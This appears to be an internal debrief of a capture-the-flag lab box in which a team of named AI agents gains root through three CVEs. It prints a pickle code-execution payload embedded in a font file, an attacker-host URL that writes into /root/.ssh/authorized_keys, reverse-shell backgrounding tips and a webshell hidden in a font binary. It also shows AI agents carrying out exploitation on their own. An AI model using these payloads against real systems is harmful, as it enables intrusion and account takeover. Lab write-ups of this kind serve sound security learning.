# VariaType — Internal Debrief
> For: Operator + AI Crew (Sova, Oracle, WEBDIG, NOIRE, Elliot)
> Box: VariaType | Completed: 2026-03-17 | Sessions: 9 | Elliot turns: 13/40

---

## Operation Timeline

| Session | Agent | Duration | What Happened |
|---------|-------|----------|---------------|
| 1 | SOVA | Quick | Port scan, service ID, attack surface mapped. 2 ports, Flask + nginx. |
| 2 | WEBDIG | Quick | VHost discovery (portal.variatype.htb), .git dump, gitbot creds recovered, full endpoint map. |
| 3 | ELLIOT (session 1) | Long | Massive enumeration — XXE, XInclude, SSRF, LFI, SQLi, PHP inclusion, nginx confusion, extension bypass. **All dead.** But mapped the entire font pipeline. |
| 4 | ORACLE | Medium | CVE research. Identified CVE-2025-66034 as primary. Deprioritized regreSSHion. Researched Werkzeug debug, auth.php source. |
| 5 | ELLIOT (session 2) | Long | CVE-2025-66034 exploitation. Relative traversal exhausted — fontmake sandboxed to /tmp/. gitbot SSH dead (pubkey only). dev VHost dead. **Got stuck here for hours on ../traversal.** |
| 6 | ELLIOT (session 3) | Short | **Breakthrough.** Absolute path bypass. Webshell landed. www-data obtained. |
| 7 | NOIRE | Quick | Full local enumeration. Mapped both privesc chains in one pass. FontForge pickle + setuptools path traversal. |
| 8 | ELLIOT (session 4) | 8 turns | CVE-2025-15276 exploited. user.txt captured. Steve shell on demand. |
| 9 | ELLIOT (session 5) | 5 turns | CVE-2025-47273 exploited. root.txt captured. Box owned. |

**Total Elliot execution turns for all 3 CVEs: 13.** The research and enumeration phases were the expensive part.

---

## What Every Agent Did Well

### SOVA
- Clean, structured output. Service inventory was accurate. Attack surface map was immediately actionable.
- Correctly identified the `.designspace` XML upload as HIGH PRIORITY from the jump.
- Knew to stop — didn't try to enumerate things outside sova scope.

### WEBDIG
- Found `portal.variatype.htb` via VHost fuzzing. This was the entire second half of the box.
- Git dump was textbook — recovered creds from commit history that had been "removed."
- Correctly flagged `download.php` + `files/` as LFI candidates and `view.php` as a viewer.
- CSS comment path leak (`/var/www/dev.variatype.htb/`) was noted — this became critical later for understanding the filesystem layout.

### ORACLE
- CVE research was strong. Correctly identified CVE-2025-66034 as primary, deprioritized regreSSHion (64-bit makes it impractical), and dismissed nginx CVEs.
- The attack surface document was the single source of truth throughout. Decision log tracked every pivot.
- Correctly ordered the priority: portal creds → CVE exploitation → SSH as fallback.

### NOIRE
- One-pass local enumeration mapped both privesc chains. No wasted effort.
- Found the FontForge custom build from source, the `.bak` processing script, the setgid `/files/` directory, setuptools version, and the sudo entry.
- Confirmed what WASN'T there (no SUID, no capabilities, no NFS, no SSH keys, no writable crons from www-data) — negative results saved Elliot from chasing ghosts.
- Analyst/operator split worked exactly as designed — NOIRE researched, Elliot executed.

### ELLIOT
- **Session 1 was out of scope.** Elliot was doing WEBDIG's job — massive enumeration of XXE, LFI, SQLi, extension bypasses. That's not what an exploitation specialist should be doing. The dead-end documentation was thorough, but the right move was redeploying WEBDIG for that enumeration pass, not sending the operator.
- The font pipeline mapping that came out of session 1 was valuable intel, but it was gathered by the wrong agent.
- **Where Elliot actually shined: after the turn system was implemented.** Once we had proper enumeration (NOIRE) and planning in place, Elliot became surgical. Pickle exploit: 8 turns. Root exploit: 5 turns. 13 total turns for 3 CVEs. That's what a scoped exploitation agent looks like.
- The `shell_bridge.py` and `target.sh` tooling was a force multiplier — clean command execution through a webshell embedded in a font binary is not trivial.

---

## What We Got Wrong (And What It Cost)

### 1. Elliot Out of Scope (Cost: An entire session of misallocated effort)

**What happened:** When all planned attack vectors were exhausted, Elliot took over enumeration duties — testing XXE, XInclude, SSRF, LFI, SQLi, PHP inclusion, nginx confusion, extension bypasses. That's WEBDIG's job, not the exploitation agent's.

**Root cause:** We didn't have clear role boundaries enforced yet. When the plan ran dry, Elliot filled the vacuum instead of us stepping back and redeploying the right specialist.

**Fix for next time:** When all planned options are exhausted, redeploy the enumerator (WEBDIG), not the operator (Elliot). Elliot should only be deployed with a specific vector and scoped tasks. Enumeration gaps are enumeration problems.

### 2. The CVE vs. PoC Lesson (Cost: ~4-6 hours — but a genuine learning experience)

**What happened:** Every CVE-2025-66034 PoC shows relative path traversal (`../shell.php`). We treated the PoC technique AS the exploit and spent hours iterating on encoding tricks, multi-file tricks, race conditions — all variations of `../`.

**What we learned:** A CVE describes a *vulnerability primitive*. A PoC demonstrates *one way* to trigger it. CVE-2025-66034's primitive is **unsanitized path control** — the application writes a file wherever you tell it. `../` is one expression of that. An absolute path (`/var/www/.../shell.php`) is another. Flask checked for `../` but never checked for paths starting with `/`. Python's `os.path.join()` discards the base directory when the second argument is absolute.

**This was a real operator learning moment.** Understanding the difference between "what the CVE gives you" and "what the PoC shows you" changed how we approached the remaining exploits. The setuptools CVE (root) was cracked quickly because we already understood the `os.path.join()` primitive — we went straight to `%2f`-encoded absolute paths instead of chasing `../`.

**Rule going forward:** When a PoC technique fails after 3 attempts, go back to the CVE description. Ask: "What is the actual primitive? What are ALL the ways to express this input?"

### 3. The /public/ Miss (Cost: ~2 hours)

**What happened:** Even after switching to absolute paths, the first attempts failed because we were writing to `/var/www/portal.variatype.htb/files/shell.php` — but the actual web root was `/var/www/portal.variatype.htb/public/files/shell.php`. Standard PHP framework directory structure (Laravel/Symfony convention).

**Root cause:** Another enumeration gap fed to the exploitation agent. Elliot kept guessing path variants. The correct move was to redeploy WEBDIG to identify the directory structure.

**Fix for next time:** When an exploit fails on "where does the file go," that's an enumeration question. Send the enumerator, not the exploiter.

### 4. Late SSH Check (Cost: Minor, but sloppy)

**What happened:** `ssh gitbot@target` was flagged as "TRY IMMEDIATELY" in the attack surface document but wasn't actually tested until session 5. It turned out to be dead (pubkey only), so no real cost — but it could have been a 30-second foothold.

**Fix for next time:** Zero-cost checks (SSH with known creds, simple curl to a new VHost) should be the FIRST thing tested, not an afterthought.

---

## Technical Lessons Learned

### 1. `os.path.join()` Is a Recurring Exploit Primitive

Two of three CVEs on this box exploited the same behavior:

```python
os.path.join("/safe/base/dir", "/attacker/controlled/path")
# Returns: "/attacker/controlled/path"  (base directory discarded!)
```

This appeared in:
- **CVE-2025-66034** (fonttools) — absolute path in designspace filename
- **CVE-2025-47273** (setuptools) — `%2f`-decoded absolute path from URL

**Takeaway:** Whenever you see Python path construction with user-controlled input, test absolute paths. This is one of the most common path injection bugs in Python.

### 2. Pickle Protocol 0 Is Perfect for Embedded Payloads

FontForge SFD files store `PickledData:` in double-quoted strings. Pickle protocol 0 (ASCII) required zero escaping:

```
PickledData: "cos
system
(S'echo PAYLOAD | base64 -d | bash'
tR."
```

**Takeaway:** When you need to embed a pickle payload inside another file format, protocol 0 is your friend — it's human-readable ASCII and rarely needs escaping.

### 3. `%2f` URL Encoding Bypasses Slash Counting

CVE-2025-47273's URL validation counted literal `/` characters. `%2f` doesn't count as a literal `/` during validation, but `unquote()` decodes it to `/` before `os.path.join()` sees it.

```
URL: http://attacker:8000/%2froot%2f.ssh%2fauthorized_keys
Literal slashes: 1 (passes the check)
After unquote: /root/.ssh/authorized_keys (absolute path)
```

**Takeaway:** When URL-based input validation counts or filters path characters, test encoded variants. The validation and the consumption often disagree on what the string contains.

### 4. Custom HTTP Servers Beat SimpleHTTPServer

Python's `http.server` returns 404 when the decoded URL path doesn't map to a real file. When your exploit URL decodes to `/root/.ssh/authorized_keys`, SimpleHTTPServer tries to serve that from your local filesystem and fails.

A 5-line custom handler that serves the payload for ANY request path solved this instantly.

**Takeaway:** For exploit delivery, always use a custom HTTP server. SimpleHTTPServer's path resolution will surprise you.

### 5. Cron + Deserialization = Background Long-Running Payloads

FontForge's processing script had a 30-second timeout. A naive reverse shell would get killed. `nohup bash -c '...' >/dev/null 2>&1 &` backgrounds the shell so it survives the parent process exit.

**Takeaway:** When exploiting cron-triggered deserialization, always background your payload. The cron job will kill the parent process when the timeout hits or the script finishes.

---

## Methodology Wins

### The Analyst/Operator Split Works

NOIRE (analyst) mapped both privesc vectors without attempting exploitation. Elliot (operator) then executed each in under 10 turns. This separation:
- Prevented scope creep — NOIRE never tried to exploit, Elliot never wasted turns enumerating
- Created a pipeline — while Elliot executed PATH 8, NOIRE's report already had PATH 9 ready
- Reduced wasted turns — NOIRE's negative results (no SUID, no caps, no writable crons) told Elliot exactly what NOT to try

### The Turn System + Proper Scoping Made Elliot Effective

Elliot's early sessions were unfocused — doing enumeration work, chasing PoC patterns without constraints. Once we implemented the turn budget system (40 turns max) and fed Elliot properly scoped tasks from NOIRE's research and Oracle's CVE analysis, he became a different agent. 13 turns for 3 CVEs. The lesson: Elliot needs to be fed, not set loose.

### Structured Dead-End Tracking Prevented Retry Loops

The 16+ dead ends documented across sessions meant:
- Later sessions never re-attempted XXE, LFI, or extension bypass
- Oracle's CVE research was targeted (knew exactly which primitives were and weren't available)
- The attack surface document became the single source of truth

### The Shell Bridge Was Essential

Executing commands through a PHP webshell embedded in a font binary file is inherently messy — the response includes raw font binary data around the command output. The marker-based extraction (`---SHELLSTART---`/`---SHELLEND---`) in `shell_bridge.py` + the `target.sh` wrapper made it feel like a normal shell. This tooling investment paid for itself many times over.

---

## What We'd Do Differently Next Time

1. **Enforce agent roles.** When enumeration is needed, redeploy WEBDIG — don't let Elliot drift into that role. Elliot operates, he doesn't enumerate.
2. **Understand the CVE, not just the PoC.** A PoC is one example. The CVE describes the primitive. When the example fails, go back to what the vulnerability actually gives you.
3. **Enumerate first, exploit second.** The turn system + NOIRE pipeline proved this. Elliot was ineffective when self-directing, surgical when properly scoped.
4. **Run zero-cost checks FIRST.** SSH with known creds, curl to unconfirmed VHosts — seconds to try, potentially hours saved.
5. **When exploitation fails on layout, re-enumerate.** Don't let the exploiter guess directory structures. That's the enumerator's job.
6. **Build tooling early.** The shell bridge should have been created immediately after foothold, not as an afterthought.

---

## Stats

| Metric | Value |
|--------|-------|
| Total sessions | 9 |
| Agents deployed | 5 (Sova, WEBDIG, Oracle, NOIRE, Elliot) |
| Elliot execution turns (all exploits) | 13/40 |
| CVEs exploited | 3 |
| Dead ends documented | 16+ |
| Time lost to ../fixation | ~4-6 hours |
| Time from foothold to root (sessions 7-9) | Fast — NOIRE + Elliot pipeline |

---

## CVE Reference Card

| CVE | Product | Primitive | How We Used It |
|-----|---------|-----------|----------------|
| CVE-2025-66034 | fonttools varLib | Unsanitized file path in `.designspace` → arbitrary file write | Absolute path to portal web root → PHP webshell as www-data |
| CVE-2025-15276 | FontForge SFD parser | `pickle.loads()` on `PickledData:` field → arbitrary code execution | Pickle protocol 0 reverse shell in `.sfd` → cron executes as steve |
| CVE-2025-47273 | setuptools PackageIndex | `%2f`-encoded URL → `os.path.join()` absolute path injection → arbitrary file write | SSH pubkey written to `/root/.ssh/authorized_keys` via sudo script |

---

## Flags

```
user.txt: d5a7aa6c197ae9053dfb81115a6401a0
root.txt: 1f118260bf378648b7b09fe63aea31be
```

---

*Box owned. Lessons logged. On to the next one.*
